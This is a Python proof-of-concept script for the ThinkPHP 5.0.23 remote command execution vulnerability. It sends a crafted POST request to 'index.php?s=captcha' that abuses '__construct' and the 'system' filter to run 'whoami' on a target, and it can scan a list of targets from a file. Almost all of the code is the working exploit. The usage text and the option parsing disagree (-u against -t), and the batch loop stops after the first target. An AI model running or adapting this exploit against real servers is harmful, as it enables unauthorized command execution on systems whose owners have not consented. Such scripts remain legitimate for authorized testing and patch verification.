'''
Author: twsec
Date: 2022-12-24 14:30:04
LastEditors: twsec
LastEditTime: 2022-12-24 17:05:37
Description: thinkphp5.0.23远程命令执行漏洞-POC
'''
from bs4 import BeautifulSoup
import requests
import getopt
import sys

def usage():
    #生成一个图案
    print(''' 


████████╗██╗    ██╗███████╗███████╗ ██████╗
╚══██╔══╝██║    ██║██╔════╝██╔════╝██╔════╝
   ██║   ██║ █╗ ██║███████╗█████╗  ██║     
   ██║   ██║███╗██║╚════██║██╔══╝  ██║     
   ██║   ╚███╔███╔╝███████║███████╗╚██████╗
   ╚═╝    ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝
                                           

python3 CVE-2018-20062-POC.py -u url / -f file
-u url: 目标地址
-f file: 批量检测
-h help: 帮助
想念你的时候，我会用你的名字喊醒自己。
''')


def check(target):
    
    
    url1 = "index.php?s=captcha"
    url = target + url1
    

    headers = { "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate", 
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0", 
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Content-Length": "73",}



    data = {
        '_method': '__construct',
        'filter[]': 'system',
        'method': 'get',
        'server[REQUEST_METHOD]': 'whoami',
    }


    try:

        response = requests.post(url=url, headers=headers, data=data, timeout=5)
        if response.status_code == 200:
            #soup = BeautifulSoup(response.text, 'lxml')
            #getexec = soup.find("table")
            
            print(response.text)
            print(target+"存在thinkphp5.0.23远程命令执行漏洞!")

            
        else:
            print(target+"不存在thinkphp5.0.23远程命令执行漏洞!")
    except:
        print("检测错误！")

#main函数

if __name__ == '__main__':
    usage()
    try:

        opts, args = getopt.getopt(sys.argv[1:], "ht:f:")
    except getopt.GetoptError:
        print('python3 CVE-2018-20062-POC.py -u url / -f file')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h' or opt == '--help':
            print('python3 CVE-2018-20062-POC.py -u url / -f file')
            sys.exit()

        if opt == '-t' or opt == '--target':
            target = arg
            #print(target)
            check(target)
            sys.exit()
        if opt == '-f' or opt == '--file':
            file = arg
            with open(file, 'r') as f:
                for line in f.readlines():
                    target = line.strip()
                    print(target)
                    check(target)
                    sys.exit()

